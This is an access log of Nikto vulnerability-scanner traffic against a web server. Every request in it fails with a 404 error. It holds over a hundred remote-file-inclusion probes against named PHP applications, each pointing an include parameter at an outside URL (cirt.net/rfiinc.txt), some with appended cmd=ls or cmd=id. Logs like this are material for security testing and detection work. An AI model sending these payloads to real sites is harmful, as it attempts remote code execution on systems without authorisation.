172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auth/auth_phpbb/phpbb_root_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 549 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004268)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /authenticate.php?default_path_for_themes=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004269)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /authentication/phpbb3/phpbb3.functions.php?pConfig_auth[phpbb_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004270)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /authentication/smf/smf.functions.php?pConfig_auth[smf_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004271)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /auto_check_renewals.php?installed_config_file=http://cirt.net/rfiinc.txt??cmd=ls HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004272)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /autoindex.php?cfg_file=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004273)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /awzmb/adminhelp.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004274)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /awzmb/modules/admin.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004275)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /awzmb/modules/core/core.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004276)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /awzmb/modules/gbook.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004277)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /awzmb/modules/help.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004278)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /awzmb/modules/reg.incl.php?Setting[OPT_includepath]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004279)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /axoverzicht.cgi?maand=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004280)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /b2-tools/gm-2-b2.php?b2inc=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004281)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /b2verifauth.php?index=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004282)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /backend/addons/links/index.php?PATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004283)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /basebuilder/src/main.inc.php?mj_config[src_path]=http://cirt.net/rfiinc.txt???? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004284)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /bb_admin.php?includeFooter=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004285)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /beacon/language/1/splash.lang.php?languagePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004286)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /beacon/language/1/splash.lang.php?languagePath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004287)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /belegungsplan/jahresuebersicht.inc.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004288)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /belegungsplan/monatsuebersicht.inc.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004289)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /belegungsplan/tagesuebersicht.inc.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004290)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /belegungsplan/wochenuebersicht.inc.php?root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004291)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /bemarket/postscript/postscript.php?p_mode=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004292)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /biblioteca/bib_form.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004293)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /biblioteca/bib_pldetails.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004294)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /biblioteca/bib_plform.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004295)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /biblioteca/bib_plsearchc.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004296)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /biblioteca/bib_plsearchs.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004297)"
172.17.0.1 - - [12/Feb/2019:08:08:30 +0000] "GET /biblioteca/bib_save.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004298)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/bib_searchc.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004299)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/bib_searchs.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 517 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004300)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/edi_form.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004301)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/edi_save.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004302)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/gen_form.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004303)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/gen_save.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004304)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/lin_form.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004305)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/lin_save.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004306)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/luo_form.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004307)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/luo_save.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004308)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/sog_form.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004309)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /biblioteca/sog_save.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004310)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bigace/addon/smarty/plugins/function.captcha.php?GLOBALS[_BIGACE][DIR][addon]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 538 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004311)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bigace/system/admin/plugins/menu/menuTree/plugin.php?GLOBALS[_BIGACE][DIR][admin]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 542 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004312)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bigace/system/application/util/item_information.php?GLOBALS[_BIGACE][DIR][admin]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004313)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bigace/system/application/util/jstree.php?GLOBALS[_BIGACE][DIR][admin]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 531 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004314)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bigace/system/classes/sql/AdoDBConnection.php?GLOBALS[_BIGACE][DIR][addon]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004315)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bild.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id HTTP/1.1" 404 498 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004316)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bin/qte_init.php?qte_root=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004317)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bingoserver.php3?response_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 471 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004318)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /block.php?Include=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004319)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /blocks/birthday.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004320)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /blocks/events.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004321)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /blocks/help.php?full_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004322)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /blogcms/admin/media.php?DIR_LIBS=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004323)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /blogcms/admin/xmlrpc/server.php?DIR_LIBS=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004324)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /blogcms/index.php?DIR_PLUGINS=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004325)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /board/post.php?qb_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004326)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /boitenews4/index.php?url_index=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004327)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /books/allbooks.php?home=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004328)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /books/home.php?home=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004329)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /books/mybooks.php?home=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004330)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bp_ncom.php?bnrep=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004331)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bp_ncom.php?bnrep=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004332)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bp_news.php?bnrep=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004333)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bridge/enigma/E2_header.inc.php?boarddir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004334)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bridge/yabbse.inc.php?sourcedir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004335)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bridges/SMF/logout.php?path_to_smf=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004336)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bu/bu_cache.php?bu_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004337)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bu/bu_claro.php?bu_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004338)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bu/bu_parse.php?bu_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004339)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /bu/process.php?bu_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004340)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /buddy.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004341)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /builddb.php?env_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004342)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /button/settings_sql.php?path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004343)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cadre/fw/class.Quick_Config_Browser.php?GLOBALS[config][framework_path]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004344)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cal.func.php?dir_edge_lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004345)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calcul-page.php?home=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004346)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendar.php?cfg_dir=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004347)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendar.php?lang=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004348)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendar.php?path_to_calendar=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004349)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendar.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004350)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendar.php?vwar_root=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004351)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendar/demo/index.php?date=&v=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004352)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendar/payment.php?insPath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004353)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendario/cal_insert.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004354)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendario/cal_save.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004355)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /calendario/cal_saveactivity.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 522 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004356)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cart.php?lang_list=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004357)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cart_content.php?cart_isp_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004358)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /catalogg/inludes/include_once.php?include_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004359)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /catalogshop.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004360)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cdsagenda/modification/SendAlertEmail.php?AGE=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 532 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004361)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cfagcms/themes/default/index.php?main=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004362)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /ch_readalso.php?read_xml_include=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004363)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /challenge.php?vwar_root=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004364)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /challenge.php?vwar_root=http://cirt.net/rfiinc.txt??&cmd=ls HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004365)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /change_preferences2.php?target=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004366)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /chat.php?CONFIG[MWCHAT_Libs]=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004367)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /chat.php?my[root]=http://cirt.net/rfiinc.txt??cm=id HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004368)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /chat/adminips.php?banned_file=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004369)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /chat/users_popupL.php3?From=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004370)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /checkout.php?abs_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004371)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /checkout.php?abs_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004372)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /ciamos_path/modules/forum/include/config.php?module_cache_path='http://cirt.net/rfiinc.txt?' HTTP/1.1" 404 535 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004373)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /circ.php?include_path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004374)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /circolari/cir_save.php?CLASSPATH=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004375)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /citywriter/head.php?path=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004376)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /cl_files/index.php?path_to_calendar=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004377)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /claroline/auth/ldap/authldap.php?includePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 523 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004378)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /claroline/phpbb/page_tail.php?includePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004379)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /claroline180rc1/claroline/inc/lib/import.lib.php?includePath=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 539 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004380)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /class.mysql.php?path_to_bt_dir=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004381)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /class/Wiki/Wiki.php?c_node[class_path]=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004382)"
172.17.0.1 - - [12/Feb/2019:08:08:31 +0000] "GET /class/jpcache/jpcache.php?_PSL[classdir]=http://cirt.net/rfiinc.txt??exec=uNikto HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004383)"
